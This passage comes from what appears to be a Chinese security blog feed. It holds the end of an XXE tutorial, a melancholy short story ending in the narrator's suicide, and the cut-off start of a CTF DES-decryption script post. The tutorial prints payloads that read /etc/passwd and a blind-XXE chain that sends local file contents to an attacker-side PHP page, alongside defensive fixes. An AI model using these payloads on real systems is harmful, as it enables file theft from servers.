<p>实例演示：参数实体+外部实体<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">    &lt;!ENTITY % name SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</div><div class="line">    %name;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
<p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p>
<p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p>
<h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>外部实体即在DTD中使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：<br><img src="/upload_image/20170620/1.png" alt=""><br>实例演示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">    &lt;!ENTITY content SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;]&gt;</div><div class="line">&lt;foo&gt;</div><div class="line">        &lt;value&gt;&amp;content;&lt;/value&gt; </div><div class="line">&lt;/foo&gt;</div></pre></td></tr></table></figure></p>
<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<h4 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h4><p>第一步检测XML是否会被成功解析：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY name <span class="string">"my name is nMask"</span>&gt;]&gt;    </div><div class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</div></pre></td></tr></table></figure></p>
<p>如果页面输出了my name is nMask，说明xml文件可以被解析。<br><img src="/upload_image/20170620/2.png" alt=""></p>
<p>第二步检测服务器是否支持DTD引用外部实体：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  </div><div class="line">&lt;!DOCTYPE ANY [  </div><div class="line">&lt;!ENTITY % name SYSTEM <span class="string">"http://localhost/index.html"</span>&gt;  </div><div class="line">%name;  </div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
<p>可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。<br><img src="/upload_image/20170620/3.png" alt=""><br>如果支持引用外部实体，那么很有可能是存在xxe漏洞的。</p>
<h4 id="xxe漏洞利用"><a href="#xxe漏洞利用" class="headerlink" title="xxe漏洞利用"></a>xxe漏洞利用</h4><p>xxe漏洞的危害有很多，比如可以文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等，这里就读取任意文件的利用方式进行测试。</p>
<h5 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h5><p>由于我是在windows上做的测试，因此让其读取c盘下的test.txt文件内容。<br><img src="/upload_image/20170620/4.png" alt=""><br>如果是linux下，可以读取/etc/passwd等目录下敏感数据。</p>
<p>以上任意文件读取能够成功，除了DTD可有引用外部实体外，还取决于有输出信息，即有回显。那么如果程序没有回显的情况下，该怎么读取文件内容呢？需要使用blind xxe漏洞去利用。</p>
<h5 id="blind-xxe漏洞"><a href="#blind-xxe漏洞" class="headerlink" title="blind xxe漏洞"></a>blind xxe漏洞</h5><p>对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。</p>
<p>创建test.php写入以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">file_put_contents(<span class="string">"test.txt"</span>, <span class="variable">$_GET</span>[<span class="string">'file'</span>]) ;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>创建index.php写入以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"><span class="variable">$xml</span>=&lt;&lt;&lt;EOF  </div><div class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;  </div><div class="line">&lt;!DOCTYPE ANY[  </div><div class="line">&lt;!ENTITY % file SYSTEM <span class="string">"file:///C:/test.txt"</span>&gt;  </div><div class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://localhost/test.xml"</span>&gt;  </div><div class="line">%remote;</div><div class="line">%all;</div><div class="line">%send;  </div><div class="line">]&gt;  </div><div class="line">EOF;  </div><div class="line"><span class="variable">$data</span> = simplexml_load_string(<span class="variable">$xml</span>) ;  </div><div class="line"><span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span> ;  </div><div class="line">print_r(<span class="variable">$data</span>) ;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>创建test.xml并写入以下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[html] view plain copy</div><div class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY % send SYSTEM 'http://localhost/test.php?file=%file;'&gt;"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>当访问<a href="http://localhost/index.php" target="_blank" rel="external">http://localhost/index.php</a>, 存在漏洞的服务器会读出text.txt内容，发送给攻击者服务器上的test.php，然后把读取的数据保存到本地的test.txt中。</p>
<p><em>注：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍啦</em></p>
<h4 id="xxe漏洞修复与防御"><a href="#xxe漏洞修复与防御" class="headerlink" title="xxe漏洞修复与防御"></a>xxe漏洞修复与防御</h4><h5 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h5><p>PHP：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
<p>JAVA:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</div><div class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</div></pre></td></tr></table></figure></p>
<p>Python：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">from lxml import etree</div><div class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</div></pre></td></tr></table></figure></p>
<h5 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h5><p>过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">http://blog.csdn.net/u011721501/article/details/43775691</a><br><a href="https://b1ngz.github.io/XXE-learning-note/" target="_blank" rel="external">https://b1ngz.github.io/XXE-learning-note/</a><br><a href="http://bobao.360.cn/learning/detail/3841.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3841.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;你会挽着我的衣袖，我会把手揣进裤兜&lt;/blockquote&gt;&lt;br&gt;　　之前在参加一场CTF竞赛中遇到了xxe漏洞，由于当时并没有研究过此漏洞，解题毫无头绪。为了弥补web安全防御知识以及减少漏洞利用短板，我翻阅了一些关于xxe漏洞的资料，学习后在此总结分享。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://thief.one/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xxe漏洞" scheme="http://thief.one/tags/xxe%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="xml注入" scheme="http://thief.one/tags/xml%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>【原创小说】盲爱</title>
    <link href="http://thief.one/2017/06/15/1/"/>
    <id>http://thief.one/2017/06/15/1/</id>
    <published>2017-06-15T03:30:00.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受<br>直到我渐渐明白了爱情的真谛，那便是可以让我变成你</blockquote><br>　　最近想研究下SSRF漏洞，听说QQ空间、朋友网分享功能处曾经发现过此漏洞，于是我便打开了多年未用的QQ空间。原本我应该打开抓包软件，静静地分析起来，然而当我无意中看到空间日志中记录着的那些年少青春，思绪忍不住回到了4年以前，那个还是白衣少年的时光，于是便着急分享分享当年的文章。<br><a id="more"></a></p>
<p><center><img src="/upload_image/20170509/1.png" alt=""></center><br>我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受。我也不断地在倾听尘世的爱情，却怎么也想象不出其中的风景，毕竟如今我的世界只剩下黑暗。</p>
<p>原本我也亲眼见过那些美好的爱情故事，也目睹过那些忧伤的青春历程。但如今，那些已经成为我脑海中关于爱情的唯一记忆。杨花落尽，尘世一夜凋零，只有那无尽的黑暗取代了繁华似锦。</p>
<p>关于那场车祸，大致发生在一年前。劫难重生后，我便永远失去了光明，以及小娜美丽动听的声音。由于车祸，小娜的声线受到了严重创伤，恐怕这辈子都无法复原。尽管如此，自那以后她还是每日来到家中帮忙照顾我，毕竟家里只剩下了年迈的母亲。</p>
<p>小娜是我唯一的女友，从高中到现在一直都是。原本我们打算进阶婚姻的殿堂，只可惜邂逅了那场车祸。从此她成了哑巴，而我则成了瞎子。当一名瞎子与哑巴交流时，语言与手势已经无济于事，于是她便在我的左手心画字，以此来传达讯息。</p>
<p>我常常询问她为何只在我的左手心画字，她笑而不语，随后在手心画上了两个字：秘密。</p>
<p>虽然我的视线中只有无际的黑暗，但小娜的身影却如同一盏明灯般时时浮现。我知道，她一直在我身旁，有时甚至我会紧紧地抱着她，亲她。但她总是害羞地在左手心写上：妈在看我们。</p>
<p>我不知道为什么每次好事将近时，母亲总是站在不远处看着我们，当然这是小娜所传达的讯息。于是，我便会喊叫一声：“妈，你在吗？”</p>
<p>“诶，在，妈在。”母亲的声音越发沧桑，虽然看不见她的脸，但我能隐约感觉到她在流泪。</p>
<p>“妈，今晚做顿好吃的吧，小娜说她饿了。”我朝着母亲嬉笑道。</p>
<p>“嗯……嗯，好，好。”母亲楞了楞神，随后擦拭着脸颊的泪水，轻声应道。</p>
<p>望着母亲转身而去的背影，小娜在我的手心写上：我才没说饿了呢，是你饿了吧。</p>
<p>我嬉笑着迎合她，我知道此刻她一定是在对我吐舌翻白眼。这一切就好像从前，当我能看见她，她也能在我身边歌唱那会儿。她生气时的神情，她撒娇时的动作，都历历在目。只是此刻也只能凭借着记忆想象出她的神情与动作，大概还是与从前一样吧。</p>
<p>每当我坐在窗前，听着窗下的繁华似锦，眼前总会浮现出小娜的身影，而她也时时陪伴在我身边。我时常向她讲述我们以往的故事，那些爱情故事。她也总是聚精会神地聆听着，还时不时地插上几句。</p>
<p>我对她说，我们相识于夏末，相知于深秋，相爱于暖冬。我问她是否还记得那如柳絮般飘零的雪花？她沉默不语，随后便在左手心画了个大大的勾。我满意地笑了笑，随后又说，那场雪下得很大，大得将要把我俩淹没，但我们还是一如既往地站在那片白茫之上，因为你说我们要在那堆出最大的雪人，我们办到了。说完，我的眼泪也不住地挂出了眼眶。小娜温柔地拭擦去我眼角的泪水，在左手心写上：那是我见过最大的雪人。</p>
<p>小娜不在的时候，我也总是会一个人自言自语。后来，我独自聊到了那场车祸。那会我们坐在婚车上，准备驶向婚姻的殿堂，却差点就在天堂举行。呵呵，我坐在那静静地傻笑，笑这弄人的命运，笑这无情的苍天。</p>
<p>“你来了啊。”笑声落地后，我知道小娜来了，于是我招呼她坐在身边。她沉默不语，随后在我的左手心写上：妈说，她很爱你。</p>
<p>片刻后，我隐约听到她拉动窗帘的声响，于是大叫道：“小娜，别！别拉开窗帘。对我来说，此刻有没有它已不重要，重要的是你时时在我身边。”说罢，我伸出手臂，向着窗帘的方向招了招手：“来，到我身边陪着我。”我像只受伤的小猫，时刻离不开主人。</p>
<p>随后我感受到了小娜带来的温度，仿佛寒冬里的一拂暖阳，融化了我内心的悲伤。我紧紧地抱着她，这次我没有理会躲在角落观看的母亲，我毅然亲吻了她，那种感觉就好像梦境。</p>
<p>“我们继续完成那场夭折的婚礼好吗？”我祈求着小娜，眼角似乎干涩地流不出泪。</p>
<p>随后，我感受到了小娜在摇晃脑袋。她又一次拒绝了我，我已数不清这到底是我多少次的失败。后来，她如往常般在我的左手心画叉。停顿片刻后，她继续缓缓写上：我想让你一起亲眼见证那个时刻。</p>
<p>我欣慰地浅浅一笑，于是便开始期待重现光明的那一刻。</p>
<p>往后的那段时光中，我总是呆呆地坐在窗前，然后寻问身后的母亲：“妈，你说我的眼睛啥时能好呢？小娜可在等着我呢。”</p>
<p>“快了，快了。”这是母亲一贯的回答，我也已经听了无数遍，只是不知道她口中的“快了”是还要多久。我只知道母亲为了我找了不少医生，虽然有时他们隔得很远，但小娜说他们都在看着我摇头，我知道他们与母亲的谈话充斥着无奈。也许，真的是无药可救了吧。</p>
<p>每当医生摇头离开后，小娜总会紧握着我的手，在身旁不停地安慰我，但我知道其实她的心比我更痛。我抚摸着她的脸，让她别哭，她也抚摸着我干涩的眼角，在手心慢慢写道：一切都会好的。</p>
<p>这天，母亲叫离了我，将我扶到屋子一角。随后她对着我说，她要跟小娜谈谈。她渐渐走远了，但她与小娜的谈话却字字入耳，当然只是她一人在说：他的眼睛恐怕永远也好不了了，求你帮他拉开窗帘透透气吧，至少……至少让他见见阳光……</p>
<p>我不知道为什么母亲要跟小娜聊这些，我只是觉得母亲变了，变得魂不守舍，变得语无伦次。虽然耳边没有小娜回应的声音，但我隐约感觉到她在微微点头。渐渐地，我感觉她们的谈话越发得模糊，最后便完全听不清了。</p>
<p>母亲走后，小娜朝着我俏皮地做了个鬼脸，不知为何我感觉到了她的动作神情，也许只是感觉吧。我对她微微一笑，淡淡地问道：“妈跟你说了什么呀？”</p>
<p>她在左手心上写道：妈说，让我俩尽快完婚。</p>
<p>我微微一惊，满脸疑惑地回应道：“是……是吗，但……但是我的眼睛好不了了，不是吗？”</p>
<p>小娜没有回应我，只是静静地依偎在我怀里，聆听着我心脏的跳动。过了半响，她才淡淡地写道：“我会让你复明的。”</p>
<p>后来，小娜就从我身边消失了。那天，我竖起耳朵想要听清她发出的细微声音，可惜听到的只有越渐远离的脚步，最后连脚步声也消失不见了，剩下的只有死一般的寂静。</p>
<p>小娜离开后，我仿佛一个人过了很久很久，久得不知道年月。那些天，我还是照常坐于窗边，听着窗外热闹的街道，听着窗边呼啸而过的风，还有，还有那满天飘零的雪。</p>
<p>“冬天，来了吗？”我在心里这样念叨，毕竟瞎子的世界不仅没有白昼，更分不清年月。“呵呵，时间过得可真快，小娜呢，离开多久了？大概快半年了吧。”</p>
<p>母亲还是习惯性地轻轻推开一道门缝，透过缝隙静静地观察坐立窗边的我，一切都是那么无声无息。但是瞎子的听觉是异于常人的，因此每每她推开房门我便都能觉察到，但也只是彼此相对无声。</p>
<p>我原本以为时间就会这么一直匆匆逝去，直到我两鬓斑白，直到母亲西去独留我于尘世。然而上苍还是有好生之德，也许它并不喜欢凡尘的俗子就这样苟活于人世吧。</p>
<p>不久后，母亲口中的“快了”终于将要应验。那天，她兴奋地跑到我面前，激动地说：“妈给你找了全省最好的医生，这回你一定能变好。”说罢，她便哽咽地泪流满面。不知为何，我没有她那般兴奋，也许是因为小娜不再了吧！</p>
<p>片刻后，我隐约看到了一丝光线，却异常得模糊刺眼，以至于我下意识地想反抗这种光亮，于是我紧闭着眼睛，久久没有睁开。我猜想，医生一定是用电筒照了我的眼眸。后来，我开始反感一切明亮之物，因为它会让我觉得很痛。于是，到最后医生也只能无奈地离去。</p>
<p>他离开时，母亲就站在门外透过门缝看着我们，我知道她一定在那，因为她一直在那。房门关闭后，我隐约听到了母亲与医生的交谈，但内容便听不清了，我也不打算听清，大概又是些医学的专业名词以及一些无奈之语吧。</p>
<p>我呆呆地坐在那，心想：呵呵，真的是无药可救了吧！小娜，你在哪呢？”一个人待久了便会回望，于是我开始回想起很多事，包括与小娜在一起的那段时光。后来，我想起了小娜写给我的最后一句话：我会让你复明的。</p>
<p>我始终没能明白她话里的含意，也许只是一种安慰之词吧。直到后来，她再一次出现了。我不知道那是在清晨、黄昏还是午夜，反正她来了，衣肩似乎还带着点雪花。她静静地走到我身边，轻轻抚摸着我的脸颊，手心很凉，但我却感到很温暖。</p>
<p>“小娜，你去哪了？”我低声问道，眼眶打着泪珠。</p>
<p>她照常抚平我的左手心，然后缓慢地写道：我一直在你身边看着你呢。</p>
<p>“你……你为什么躲着不见我呢？”我失落地问道。</p>
<p>随后，我感觉她的脸颊微微一笑，好似看待撒娇的小孩那般看着我。紧接着，我感受到了左手心书写的字：因为我在找让你复明的方法。</p>
<p>“找到了吗？”我语气平淡地问道。</p>
<p>她犹豫了会，然后继续写道：嗯，我带你去个地方吧。</p>
<p>她这样写道，还没等我反应，她便拉着我往外走。我兴奋地笑了，因为我已经好久没有出过房门。不过不久后她便停下了脚步，她说，母亲正在门外静静地看着我们。</p>
<p>“妈，你在吗？”我照常大叫道。</p>
<p>“诶，在，妈在。”听着母亲抹泪后的回应，我心里不免一丝伤痛，因为只有她一直守候在我身边。我顿了顿身，朝着身边的小娜看了眼，虽然只有漆黑一片，但我知道她就在那，然后转头对着母亲说：“妈，我跟小娜要出去走走，你就在家等着我们吧。”</p>
<p>“诶……好……好，路……路上小心。”母亲颤颤巍巍地答道。</p>
<p>获得母亲的允许后，小娜便引着我踏上了屋外的世界。虽然看不见，但我依然听见了走离房间后的关门声，以及屋外瑟瑟的寒风。小娜说，外面是漫天的雪，就好像高中那会我们堆雪人时的那样，漫天飘零。在小娜的描述下，我似乎看见了那片雪地。我俯身随机抓了一把，手心忽感一阵凉意，那应该就是雪的温度吧。</p>
<p>这天，小娜带着我踏遍了无数的雪地，堆了各式的雪人。那些快乐的场景，那些雪人的模样，那场漫天的暴雪，还有小娜可爱迷人的姿态，一切都历历在目，虽然此刻我看不见。</p>
<p>我们在雪中玩了很久很久，久得忘记了白天黑夜。直到小娜说，她要走了。于是，我们便只能这样遗憾的散场，彼此缓缓撇下手心的最后一把雪。</p>
<p>回到家的时候，母亲似乎不在。我邀请小娜坐到我身边，陪着我聊天，陪着我看那场依然没有消散的雪。但她说，她要走了。起初我还以为她只是想回家，直到此刻我才知道，她是想离开我。</p>
<p>我紧紧地握着她的手，一刻不放，苦苦哀求道：“小娜，求你了，别离开我！”</p>
<p>她用力甩了甩手，力气大得将我摔倒在地。见状，她紧张地凑近我的身子，在左手心上写道：我找到了让你复明的办法，但我必须得离开你。</p>
<p>“不，不，如若这样，我宁愿永远活在黑暗中。”我嘶叫着，眼中满是恐惧与痛苦。</p>
<p>小娜没有继续写道，只是扶着我静静地走到窗边。她轻轻掀开了窗帘一角，我似乎看到了她嘴角的浅笑。她让我看一看窗外的世界，我顺着她的目光挪步到窗前，但迎面而来的只有刺眼的强光。我睁不开眼，只得用手挡住视线，我哀求道：“小娜，我的眼睛很痛，不，胸口很痛，求你把窗帘拉上吧！”</p>
<p>小娜没有理会我的哀求，只是转过脑袋静静地看着我。透过强光，我仿佛看到了她那双不舍的眼睛，似乎正在跟我说着离别。我眯着眼，试图看清她的模样，看清她眼角的泪，心中的伤。然而视线中却只有刺眼的天光，无尽延伸后迷茫了一切。</p>
<p>“小娜”我这样呼唤着她，但她只是看着我微微一笑。而后我似乎看见她轻轻地打开了玻璃窗，窗外吹进的清风吹拂了她的长发，风中衣袂飘飘。</p>
<p>迎着天光，迎着清风，她回眸一笑。我也笑了，笑得很甜，因为此刻她在我眼中很美，她穿着嫁衣，白色嫁衣。我渐渐明白，她是想与我一道完成那场婚礼，因为我已经渐渐看清了她的容颜。</p>
<p>我慢慢地走近她，想近距离地看清她，抚摸她。然而，她伸出右手阻止了我，她嘴角微微一笑，笑出了声，似乎还没等到我走出这迷幻的世界，她便已纵身跃向了窗外的纷飞繁华。</p>
<p>“不！”我疯狂地吼叫着，试图挽回跳窗而下的小娜，但已为时过晚。</p>
<p>叫声过后，母亲奋力开启了房门。她静静地望着窗边的我，我绝望地看着门外的她。对望间，我看见了她眼角的泪以及写满整张脸的恐惧。</p>
<p>她看着我缓缓走向窗边，看着我轻轻打开玻璃窗。于是，她开始嘶吼，她试图阻止我的行动。她奋力扑身而来，就如同我扑向小娜那般，但我阻止了她。我对着她微微一笑，笑出了声，似乎还没等她走近我的世界，我便纵身消失在她的视线中。</p>
<p>下落间，我仿佛听见了母亲撕心裂肺的吼叫，那般绝望痛苦。但我很想告诉她，我即将要跟小娜完婚，因为我看见自己身上正穿着结婚那日的礼服。</p>
<p>慢慢地，我慢慢接近了小娜，我看见她就躺在我身边，同样的一片血泊之中。我笑了，我笑我们终于可以如愿以偿，终于可以听见礼堂的钟声，终于可以完成婚礼，即使这一切发生在天堂。</p>
<p>我看见小娜紧闭着眼睛，嘴角是浅浅的笑容，我知道她也一定很高兴吧。我吃力地爬到她身边，想凑近看清她的容颜，是否也美如当年呢？</p>
<p>渐渐地，我渐渐看清了她，然而映入我眼帘的并不是小娜，而是我自己。</p>
<p>呵呵，是我吗？</p>
<p>后来，我似乎听见了母亲与医生的那段谈话。</p>
<p>“你儿子患的是精神分裂与妄想症，要想治愈必须找到他幻想出的小娜，因为只有她才能打开他心里的那扇窗，才能带他重新回归光明与现实。”医生担忧道。</p>
<p>“小娜，她已经死了。那是在一年以前，我记得那天下着大雪，他们坐着婚车准备前往礼堂。然而那天的雪下得很大，大得几乎将要把他们淹没。当婚车经过盘山公路时，由于车轮打滑，车身失去了方向，便连人带车一道滚下了山崖。后来，他获救了，但小娜却永远埋在了白雪之下。自那以后，他便将自己关在这黑屋之中，常常坐着自言自语，我想他一定是见到小娜了，一定是！”母亲哽咽道。</p>
<p>后来，我似乎又听到了母亲说的那段对话：“他的眼睛恐怕永远也好不了了，求你帮他拉开窗帘透透气吧，至少……至少让他见见阳光。”原本我以为这是母亲对小娜说的话，后来才知道，她说话时一直望着我。</p>
<p>我感觉自己昏昏欲睡，仿佛身处梦境。于是，我隐约听到了小娜的笑声，她笑着问我：“你爱我吗？”</p>
<p>“傻瓜，这还用问吗？”<br>“那你有多爱我？”<br>“呃……爱到可以让我变成你！”</p>
<p>呵呵，小娜，原来我已经爱到变成了你，至少右手变成了你。原来你所说复明的方法就是让你消失，不，如若那样，我宁愿永远活在黑暗与幻想中，至少那样很美。</p>
<p>梦中我仿佛闻到了花香，寒冬逝去，暖春归来。</p>
<p>我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受。直到我渐渐明白了爱情的真谛，那便是可以让我变成你！</p>
<p>the end。</p>
<p>后记：盲爱这篇小说本来是为了参加短篇大赛准备的，只可惜没有被选中，原因是文风太青涩，现在读来却是如此，但本篇是我最喜爱的一篇，因为剧情有很多耐人寻味的点，这也是我最想表达的东西。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受&lt;br&gt;直到我渐渐明白了爱情的真谛，那便是可以让我变成你&lt;/blockquote&gt;&lt;br&gt;　　最近想研究下SSRF漏洞，听说QQ空间、朋友网分享功能处曾经发现过此漏洞，于是我便打开了多年未用的QQ空间。原本我应该打开抓包软件，静静地分析起来，然而当我无意中看到空间日志中记录着的那些年少青春，思绪忍不住回到了4年以前，那个还是白衣少年的时光，于是便着急分享分享当年的文章。&lt;br&gt;
    
    </summary>
    
      <category term="诗意年华" scheme="http://thief.one/categories/%E8%AF%97%E6%84%8F%E5%B9%B4%E5%8D%8E/"/>
    
    
      <category term="原创小说" scheme="http://thief.one/tags/%E5%8E%9F%E5%88%9B%E5%B0%8F%E8%AF%B4/"/>
    
  </entry>
  
  <entry>
    <title>CTF加密与解密</title>
    <link href="http://thief.one/2017/06/13/1/"/>
    <id>http://thief.one/2017/06/13/1/</id>
    <published>2017-06-13T03:22:25.000Z</published>
    <updated>2017-07-25T12:05:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">科技的精灵已经从瓶中跑了出来，但我们还不知道真正降临的时刻</blockquote><br>　　今日在翻看笔记的时候，无意看到了之前为参加CTF时做的准备工作，主要包括了各种加密解密，web安全，PWN溢出等内容的练习题以及解决脚本。由于内容部分来自本人参加ctf时所做的题以及部分来自互联网，因此准备在此分享记录一番。本篇主要介绍几种CTF中常见加密算法的解密脚本，关于加密原理会适当提及，但不会深入。<br><a id="more"></a></p>
<h3 id="DES解密"><a href="#DES解密" class="headerlink" title="DES解密"></a>DES解密</h3><p>原理不多说了，直接放脚本源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#Des算法一般密钥长度为8位（可以是8的倍数），且加密与解密算法相同。（私有密钥，对称加密方式）</span></div><div class="line">from pyDes import *</div><div class="line">import threading</div><div class="line">import Queue</div><div class="line">import os</div><div class="line">import sys</div><div class="line">import time</div><div class="line">from multiprocessing import Process,Pool,Manager</div><div class="line">import 